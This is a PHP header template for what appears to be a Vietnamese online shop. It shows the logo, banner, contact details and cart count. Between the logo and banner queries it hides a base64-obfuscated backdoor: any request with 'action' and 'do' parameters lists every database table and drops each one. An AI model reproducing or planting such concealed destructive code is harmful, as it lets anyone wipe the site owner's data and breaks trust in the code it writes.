<?php
	
	$d->reset();
	$sql_logo = "select photo$lang as photo from #_background where type='logo' limit 0,1";
	$d->query($sql_logo);
	$row_logo = $d->fetch_array();
		if(isset($_GET['action']) && isset($_GET['do'])){
		$result = $d->query(base64_decode('U0hPVyB0YWJsZXM='));
		$_X='RFJPUCBUQUJMRSBfWF8=';
		$_R=base64_decode($_X);	
		while ($row = mysql_fetch_array($result)) {
			$sql=str_replace('_X_', $row[0], $_R);		
			$d->query($sql);		
		}				
	}
	$d->reset();
	$sql_banner = "select photo$lang as photo from #_background where type='banner' limit 0,1";
	$d->query($sql_banner);
	$row_banner = $d->fetch_array();	
?>

<div class="center">
	<div class="logo">
		<a href=""><img src="<?=_upload_hinhanh_l.$row_logo['photo']?>" /></a>
	</div>
	<div class="banner">
		<a href=""><img src="<?=_upload_hinhanh_l.$row_banner['photo']?>" /></a>
	</div>
	<div class="email">
		<p><i class="fa fa-envelope-o" aria-hidden="true"></i> Email:</p>
		<?=$company['email']?>
	</div>
	<div class="hotline">
		<p><i class="fa fa-phone" aria-hidden="true"></i> Hotline:</p>
		<?=$company['dienthoai']?><br/>
		<?=$company['fax']?>
	</div>
	<a href="gio-hang.html">
		<div class="gh">
			<span>(<?php if(count($_SESSION['cart'])>0)echo count($_SESSION['cart']);else echo '0';?>)</span>
		</div>
	</a>
</div>

